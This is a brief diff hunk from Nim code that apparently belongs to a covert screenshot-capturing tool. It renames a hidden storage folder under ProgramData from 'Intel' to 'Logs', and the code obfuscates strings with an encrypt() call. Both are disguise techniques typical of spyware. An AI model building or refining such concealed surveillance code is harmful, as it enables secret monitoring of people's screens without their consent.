@@ -323,7 +323,7 @@ proc takeScreenshots(folderPath: string, duration: int) =
 
 # Main program
 var programDataPath = getEnv("PROGRAMDATA")
-var javaFolderPath = programDataPath / "Intel"
+var javaFolderPath = programDataPath / "Logs"
 var currentDate = now().format(encrypt("yyyy-MM-dd"))
 var folderPath = javaFolderPath / currentDate
 
